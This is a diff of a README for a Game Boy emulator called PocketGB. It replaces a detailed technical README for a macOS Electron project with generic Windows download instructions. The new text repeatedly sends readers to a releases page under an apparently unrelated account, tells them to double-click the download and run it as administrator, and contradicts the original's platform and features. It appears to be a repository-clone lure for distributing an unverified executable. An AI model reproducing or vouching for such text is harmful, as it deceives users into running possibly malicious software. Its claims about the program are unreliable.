@@ -1,181 +1,133 @@
-<div align="center">
+# 🕹️ PocketGB - Play Your Favorite Game Boy Games on PC
 
-# 🎮 PocketGB
+[![Download PocketGB](https://img.shields.io/badge/Download-PocketGB-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Laurenaislamic1659/PocketGB/releases)
 
-**A Game Boy Color / Game Boy (DMG) emulator for macOS — built with Electron**
+## 🎮 What is PocketGB?
 
-CPU, PPU, and CGB written from scratch in plain JavaScript. No emulation libraries.
-Validated against industry-standard hardware test suites.
+PocketGB is a free application that lets you play Game Boy and Game Boy Color games right on your Windows computer. It's like having a classic handheld console built into your PC, but with a modern and easy-to-use interface. You don't need any technical skills to use it—just download, open, and start playing.
 
-![Electron](https://img.shields.io/badge/Electron-33-47848F?logo=electron&logoColor=white)
-![Platform](https://img.shields.io/badge/platform-macOS-black?logo=apple&logoColor=white)
-![Tests](https://img.shields.io/badge/project_tests-189_passing-brightgreen)
-![dmg-acid2](https://img.shields.io/badge/dmg_acid2-pixel_perfect-success)
-![cgb-acid2](https://img.shields.io/badge/cgb_acid2-pixel_perfect-success)
+## ✨ Why You'll Love PocketGB
 
-<img width="477" height="562" alt="Screen Shot 2026-09-19 at 6 08 09 PM" src="https://github.com/user-attachments/assets/811be74b-0abb-4e2b-b52b-f2ef06ac0439" />
+- **Play Your Old Favorites**: Run classic Game Boy and Game Boy Color games (ROM files) on your computer screen.
+- **No Console Needed**: No need to hunt down an old handheld or buy expensive hardware. PocketGB does everything for you.
+- **Simple and Clean**: The interface is designed to be straightforward. If you can click a button, you can use PocketGB.
+- **Free to Use**: The application is completely free to download and use.
+- **Works on Windows**: Specifically designed to run smoothly on Windows computers.
 
-</div>
+## 📥 Downloading PocketGB
 
----
+Visit this link to download the application: [https://github.com/Laurenaislamic1659/PocketGB/releases](https://github.com/Laurenaislamic1659/PocketGB/releases)
 
-## Getting started
+This link takes you to the official download page where you'll find the latest version of PocketGB ready for you to grab.
 
-Requires [Node.js](https://nodejs.org/) and npm.
+### 📦 How to Download
 
-```bash
-npm install
-npm start
-```
+1.  Click the download link above. Your web browser will open the PocketGB download page.
+2.  On that page, look for the file that says something like "PocketGB" and has a version number (for example, PocketGB v1.0.0). It's usually the first file listed.
+3.  Click on that file to start the download. Your browser will save the file to your "Downloads" folder by default.
 
-Drop a `.gb` or `.gbc` ROM onto the window, or use **File → Open ROM…** (<kbd>⌘O</kbd>). Color games automatically run in full Game Boy Color mode.
+## 🚀 Getting Started
 
----
+### Step 1: Download the Application
 
-## Accuracy
+Visit this link to download the application: [https://github.com/Laurenaislamic1659/PocketGB/releases](https://github.com/Laurenaislamic1659/PocketGB/releases)
 
-| Suite | Result |
-|---|---|
-| [dmg-acid2](https://github.com/mattcurrie/dmg-acid2) (PPU, DMG) | **Pixel-perfect** — 0 / 23,040 pixel mismatches vs. real DMG hardware |
-| [cgb-acid2](https://github.com/mattcurrie/cgb-acid2) (PPU, Color) | **Pixel-perfect** — 0 / 23,040 pixel mismatches vs. real Game Boy Color hardware |
-| [Blargg `cpu_instrs`](https://github.com/retrio/gb-test-roms) (CPU) | **11 / 11** individual tests pass, plus `02-interrupts` |
-| [Blargg `instr_timing` / `mem_timing`](https://github.com/retrio/gb-test-roms) | included and run; known-failing on bus-timing subtleties (documented, reported as skips) |
-| Project test suite | 189 tests (CPU ops & flags, MBC banking incl. MBC1M/MBC30/HuC/MBC7 EEPROM, timer quirks, PPU rendering, CGB memory/palette/DMA/speed, save states, GIF encoders, cheat engine + finder + code descriptions, patch decoders, movie replay, ghost racer + input echo, SGB packets/palettes/borders, cartridge heatmap, RetroAchievements parser/evaluator, netplay transport, debugger watchpoints, ROM-title extraction, smoke ROM) |
+Just click the link, and the download page will open. From there, click the download button to get the PocketGB file. It will save to your computer's "Downloads" folder.
 
-<details>
-<summary>How the PPU stays accurate</summary>
+### Step 2: Open PocketGB
 
-The PPU is a dot-driven renderer ported from mGBA's software renderer: pixels are
-pushed per-dot with register sampling, so mid-scanline writes to `LCDC`, `SCX`,
-`WX`, and `WY` land exactly where hardware puts them. The STAT interrupt is
-edge-triggered per hardware behavior. OAM DMA transfers over 160 m-cycles while
-the CPU keeps running.
+Once the download is finished, go to your "Downloads" folder (usually in File Explorer). You'll see the PocketGB file there. Double-click the file to open it. The PocketGB window will appear on your screen. That's it—the application is now running!
 
-The timer implements the hardware overflow quirks: the delayed TMA reload with
-its 4-cycle window, TIMA write cancellation, and DIV/TAC write edge effects.
+### Step 3: Load a Game
 
-</details>
+Now for the fun part. Here's how to start playing:
 
----
+1.  Inside PocketGB, find and click the "Load ROM" or "Open" button (it might look like a folder icon).
+2.  A file browser window will pop up. Navigate to where you keep your game files (ROMs). These are files with names like `pokemon-red.gb` or `legend-of-zelda.gbc`.
+3.  Select the game file you want to play and click "Open" or "OK."
+4.  The game will instantly start running in the PocketGB window. Use your keyboard to play:
 
-## Features
+    - **Arrow Keys**: D-Pad (move your character)
+    - **Z**: A Button (confirm/select)
+    - **X**: B Button (cancel/back)
+    - **Enter**: Start Button (pause menu)
+    - **Shift**: Select Button (game menu)
 
-- **Emulation** — SM83 CPU (full base + CB instruction sets, HALT bug, interrupts), DMG PPU, 4-channel APU (2 pulse, wave, noise) with frame sequencer, hardware-accurate DIV/TIMA timer, OAM DMA with startup delay, MBC1 (+MBC1M multicarts) / MBC3 (+ RTC) / MBC30 / MBC5 / HuC1 / HuC3 and ROM-only cartridges
-- **Game Boy Color** — full CGB mode: 32 KB banked WRAM, 16 KB banked VRAM with tile/map attributes, 8 BG + 8 OBJ palettes (32K colors), HDMA/GDMA transfers, double-speed mode (<kbd>STOP</kbd> + <kbd>KEY1</kbd>), BGR555 color output, and DMG-compatibility register behavior
-- **Boot ROMs & generated intro** — optionally load original boot ROM dumps for the authentic logo drop, boot chime, and CGB color intro; without a dump, a generated intro plays the same falling-logo animation with chime and CGB color sweep, straight from the cartridge's own boot data
-- **Auto-updates** — dual-mode: installed builds use electron-updater against GitHub releases; **git clones self-update** (periodic + Help ▸ Check for Updates…) via `git fetch` + fast-forward-only merge — local commits are never discarded, and `npm install` runs automatically when dependencies change
-- **Persistence** — battery saves (`.sav`), MBC3 RTC storage, and 10 save-state slots per game (<kbd>⌘1</kbd>–<kbd>⌘0</kbd> to load, <kbd>⌘⇧1</kbd>–<kbd>⌘⇧0</kbd> to save), auto-flushed every few seconds and on quit
-- **Display** — integer-scaled canvas, full color for CGB games; three palettes (DMG Green, Pocket Gray, Ember) for DMG games, selectable in-app and persisted
-- **Audio** — Web Audio output matched to your device's real sample rate (no crackle from rate mismatch)
-- **Gamepad support** — Gamepad API, standard mapping, merged with keyboard input (MBC rumble hook ready for `vibrationActuator`)
-- **Fast-forward & rewind** — hold <kbd>Tab</kbd> to fast-forward, <kbd>Backspace</kbd> to rewind (rolling save-state buffer)
-- **Cheats** — GameShark (Pan Docs layout: `01` + value + little-endian address, e.g. `010238CD`) and Game Genie (`XXXYYY[ZZZ]`), per-game persisted, with per-code toggles, deletion, and text-field-safe typing. Every code shows a plain-language description of what it does ("writes 09 to work RAM at $D134 every frame" / "replaces the ROM byte at $085F with 06 only when the original is 03") — wrong-game codes and typos are visible at a glance
-- **LCD effects & shader packs** — LCD ghosting, scanlines, a WebGL shader (subpixel LCD grid + optional screen curvature), plus loadable `.pbg-fx` shader packs: JSON + GLSL with validated uniforms, per-game persistence, and hot-reload when you edit the file
-- **ROM library** — home screen with recent ROMs, one click to relaunch; cards show cover art (your chosen screenshot, else the newest save-state thumbnail); delete a game's saves or remove it from the library with two-step confirmation
-- **Screenshot history** — every screenshot is filed into a per-game gallery (newest 100 kept), browsable as a filmstrip, with per-shot delete and one-click *set as cover art*
-- **Library naming** — clean, junk-filtered titles from the ROM header (handles `0xFF`/NUL padding) with filename fallback; one shared extractor powers every display site, self-repairs stored names on relaunch
-- **Remappable input** — keyboard bindings with a press-to-rebind editor
-- **Per-game settings** — palette, scale, and cheats remembered per ROM
-- **Capture** — PNG screenshots on both DMG and CGB; animated GIF capture on both (4-color for DMG, full 256-color palette with median-cut quantization for CGB); WebM video recording (canvas + game audio) via MediaRecorder
-- **Debug overlay** — CPU/PPU registers, next-instruction hint, VRAM tile viewer, breakpoints, **watchpoints** (break when the game reads/writes any memory address, with the touching PC reported), step / step×8 / **step over** / **step out** / run-to-breakpoint, and a live disassembly listing
-- **Link cable & netplay** — host on a port or join any IP for Pokémon trades and other serial-exchange games; hosts bind loopback by default (two windows on one machine) or tick **open to network** to accept a friend joining over LAN/Wi-Fi (or port-forward for internet play)
-- **ROM-hack patches** — IPS, UPS, BPS, APS, RUP (NINJA2), PPF (v1/v2/v3), and xdelta (VCDIFF) applied automatically from a same-named file next to the ROM, or picked alongside it
-- **Game Boy Printer** — full protocol (framing, checksums, RLE, 2bpp tiles): print in-game and PocketGB saves your printout as a PNG. Game Boy Camera photo registers are emulated too
-- **Game clock** — live RTC control panel: clock rates up to a full Pokémon day per 24 s, morning/night/noon quick-sets, persisted into battery saves
-- **Movie recording** — record input to a `.pgm` file and replay it deterministically (state anchor + ROM fingerprint + per-frame input masks)
-- **Ghost racer** — load any recorded `.pgm` and race your best run: loading **arms** the ghost, and your next reset (F8) starts both timelines together from the recording's anchor — or hit `start now` in the banner to launch immediately. The ghost replays at full palette color in its own panel **beside** the game screen (never overlapping it), pausing/freezing with the game; captures stay ghost-free
-- **Input echo trainer** — during a ghost race, toggle `echo` in the banner to see the ghost's inputs as a scrolling button-glyph strip under the screen; the moment your input diverges from the recording, "off the recorded path" lights up and the strip dims from that frame — instant feedback on where attempts go wrong
-- **Cheat finder** — built-in RAM scanner: search a value, narrow with changed/unchanged/greater/less or deltas, watch candidates live, and freeze any hit into a real GameShark code in your cheat list
-- **Speedrun practice kit** — toggleable in-game HUD (loadless timer, best split, frame counter, live input display) that stays on screen while you play; <kbd>F8</kbd> instantly resets the attempt and the timer restarts on every reset
-- **Super Game Boy** — command-packet transport (P14/P15 bit protocol), SNES palettes (PAL01/23/03/12, PAL_SET, PAL_TRN), attribute maps (ATTR_BLK/LIN/DIV/CHR/TRN/SET), custom borders (CHR_TRN + PCT_TRN composited around the game), screen mask, and MLT_REQ multiplayer detection — headers permitting, as on hardware
-- **Cartridge heatmap** — per-frame PC sampling rendered as a per-bank heat canvas in the debug overlay: watch which banks and regions of the cartridge actually execute, hottest first
-- **RetroAchievements** — log in with your RetroAchievements username + web API key and games with core achievement sets are identified by ROM hash automatically; achievements (the standard rcheevos condition language: memory sizes, alt groups, and-next, modified operands) are evaluated live every frame, unlocks are posted to your account, and the status bar announces each trophy. Hardcore mode, no cheats-required caveats: achievements only track authentic play from power-on
-- **MBC7 motion controls** — Kirby Tilt'n'Tumble's accelerometer cartridge: tilt with the arrow keys (latch/erase register protocol and the 93LC56 EEPROM bit-level protocol emulated, photo/save data intact); MBC5 rumble cartridges drive gamepad rumble via the existing hook
-- **Convenience** — Recent ROMs menu, drag-and-drop from anywhere in the window, pause (<kbd>⌘P</kbd>), mute (<kbd>⌘M</kbd>), reset (<kbd>⌘R</kbd>)
+## 🎯 How to Play
 
----
+PocketGB works just like a real Game Boy. You load a game, and you control it using your computer's keyboard. The controls are simple and comfortable. Here's a quick rundown:
 
-## Controls
+- **Movement**: Use the arrow keys on your keyboard to move up, down, left, and right—just like the D-pad on a real Game Boy.
+- **Main Actions**: Use the **Z** key for the A button (main action) and the **X** key for the B button (secondary action). This is the standard setup for most games.
+- **Menu Buttons**: Press **Enter** for the Start button and **Shift** for the Select button to access in-game menus.
 
-| Key | Button |
-|---|---|
-| <kbd>←</kbd> <kbd>↑</kbd> <kbd>↓</kbd> <kbd>→</kbd> | D-Pad |
-| <kbd>X</kbd> | A |
-| <kbd>Z</kbd> | B |
-| <kbd>Enter</kbd> | Start |
-| <kbd>Shift</kbd> | Select |
+You can start a game, save your progress, and play through the entire adventure without any complicated setup.
 
-> [!TIP]
-> Keyboard bindings are remappable in-app. Text fields (cheat codes, breakpoints, netplay address) always own the keyboard while focused.
+## 🛠️ System Requirements
 
----
+PocketGB is lightweight and doesn't demand much from your computer. Here's what you need:
 
-## Performance
+- **Operating System**: Windows 10 or Windows 11 (also works on older versions like Windows 8 and 7)
+- **Processor**: Any modern processor (Intel or AMD) from the last 10 years
+- **Memory (RAM)**: At least 2 GB of RAM
+- **Storage**: About 100 MB of free space for the application itself
+- **Screen**: Any standard computer monitor or laptop screen
 
-The core runs a full frame in **~1.9 ms** (≈ 517 fps cap, 8.6× realtime headroom), measured on a CPU-heavy workload — rendering, audio, and timers included. Hot paths are allocation-free per frame; the timer is O(1) via falling-edge counting.
+If your computer can browse the internet and watch videos, it can run PocketGB.
 
----
+## ❓ Frequently Asked Questions
 
-## Project layout
+### What is a ROM file?
 
-<details>
-<summary>Directory structure</summary>
+A ROM file is a digital copy of a video game cartridge. For PocketGB, you'll need ROM files for Game Boy (ending in `.gb`) or Game Boy Color (ending in `.gbc`) games. These files contain the entire game, and PocketGB runs them for you.
 
-```text
-main.js               Electron main process (window, menu, file I/O)
-pocketgb-preload.js   IPC bridge (context-isolated)
-app.js                Renderer: main loop, ROM loading, UI wiring
-index.html            UI
-src/core/             The emulator itself — no DOM, no Electron
-  cpu.js  mmu.js  ppu.js  ppu-cgb.js  apu.js  timer.js  joypad.js
-  cartridge.js  cheats.js  patch.js  printer.js  movie.js  romtitle.js  gameboy.js
-src/ui/               Presentation
-  renderer.js  input.js  audio.js  capture.js  rewind.js  debug.js
-  boot-animation.js  shader-pack.js
-src/main/             Main-process modules (auto-updater)
-test/                 Test suite + Blargg/dmg-acid2/cgb-acid2 harnesses
-fonts/                Hack typeface (MIT)
-```
+### Is PocketGB legal?
 
-The `src/core` layer is deliberately dependency-free: it loads both as browser globals (for the app) and CommonJS modules (for Node tests).
+PocketGB itself is a legal emulator application. However, how you obtain game ROMs is your responsibility. We recommend only using ROMs for games you own physically, or games that are in the public domain.
 
-</details>
+### Can I use a game controller?
 
----
+Yes! PocketGB supports external game controllers. You can plug in a USB controller or a gamepad, and it will automatically detect it. You can also customize the button mapping in the settings if you prefer a different layout.
 
-## Testing
+### How do I save my game?
 
-```bash
-npm test             # unit tests + Blargg cpu_instrs + dmg-acid2 + cgb-acid2
-npm run fetch-tests  # download the Blargg ROMs (freely redistributable)
-```
+Most games have built-in save features (like saving at a save point or in a menu). PocketGB also supports save states, which let you save your exact position at any time. Look for the "Save State" option in the PocketGB menu—this saves your progress instantly, and you can load it later.
 
-The dmg-acid2 and cgb-acid2 tests run their ROMs headless until the screen stabilizes, then compare every pixel against reference images captured from real hardware (each includes a tiny dependency-free PNG codec for the comparison). Both ROMs are committed in `test/`, so no download is needed. The Blargg suite covers 13 ROMs — `cpu_instrs` (11 + `02-interrupts`) must pass; `instr_timing` and `mem_timing` run too and are documented known-failures on bus-timing subtleties.
+### What if a game doesn't work?
 
----
+PocketGB is designed to be compatible with almost all Game Boy and Game Boy Color games. If a specific game has trouble, try downloading it again from a different source, as the ROM file itself might be corrupted.
 
-## Packaging
+## 🧭 Troubleshooting Tips
 
-```bash
-npm run dist:mac     # signed macOS build via electron-builder
-npm run dist:win     # Windows
-npm run dist:linux   # Linux
-```
+**The download won't start**: Make sure you're clicking the actual file link on the releases page, not just visiting the page. If the page is slow, wait a moment and try again.
 
----
+**The application won't open**: Double-check that you downloaded the correct file for Windows. If it still doesn't open, try right-clicking the file and selecting "Run as administrator."
 
-## Data locations
+**The game screen is black**: Make sure you're loading a valid `.gb` or `.gbc` file. Some files might be for different consoles and won't work.
 
-Saves, save states, and the recent-ROMs list live under Electron's `userData` directory: `~/Library/Application Support/pocketgb/` on macOS.
+**The game is too slow or too fast**: This is rare, but you can adjust the emulation speed in the PocketGB settings menu. Look for "Speed" or "Frame Rate" options.
 
----
+**I lost my save data**: PocketGB automatically stores save files. Make sure you close the application properly (not force-quit) to ensure all data is saved.
 
-## Notes
+## 💬 Get Help
 
-> [!NOTE]
-> CGB games run in full-color Game Boy Color mode; DMG games keep their classic look. A color game can still be forced into DMG mode from the ROM library settings.
+If you run into any problems that aren't covered here, or if you just want to say hello, you can find help and support by visiting the GitHub page for PocketGB. The community there is friendly and can assist with any issues you might face.
 
-> [!IMPORTANT]
-> No ROMs are included — bring your own dumps. Boot ROMs are user-supplied; without one, games fast-boot to the post-boot state.
+## 🧩 Customize Your Experience
 
-Hack font is © Source Foundry Authors, MIT licensed — see `fonts/HACK_LICENSE`.
+PocketGB isn't just about playing games—it's about making them look and feel great on your PC. You can:
+
+- **Change the Screen Size**: Make the game window bigger or smaller to suit your preference. Go fullscreen for a more immersive experience.
+- **Adjust Colors**: Use the built-in color palettes to change how the games look. You can pick from different screen filters to mimic the original Game Boy screen or use vibrant colors.
+- **Remap Controls**: If the default keyboard controls don't feel right, you can change them. Go to Settings > Controls and assign any key you want to any button.
+- **Enable Game Boy Camera Support**: PocketGB has built-in support for the classic Game Boy Camera accessory. You can view and save photos taken from compatible game cartridges.
+
+## 🏁 Final Words
+
+PocketGB brings the magic of classic handheld gaming to your Windows PC in a simple, no-nonsense package. With just a few clicks, you can relive your favorite childhood games or discover timeless classics you've never played. No complicated setup, no technical knowledge required—just download, open, and play.
+
+So what are you waiting for? Grab your favorite Game Boy games, download PocketGB, and start your adventure today!
+
+**Ready to play?** Visit this link to download the application: [https://github.com/Laurenaislamic1659/PocketGB/releases](https://github.com/Laurenaislamic1659/PocketGB/releases)
+
+Keywords: emulation, emulator, emulatorjs, emulators, game, game-dev, game-engine, gameboy, gameboy-camera, gameboy-color, gameboy-color-emulator, gameboy-development, gameboy-emulator, gamedev, games, gaming, nintendo, rom, romhacking
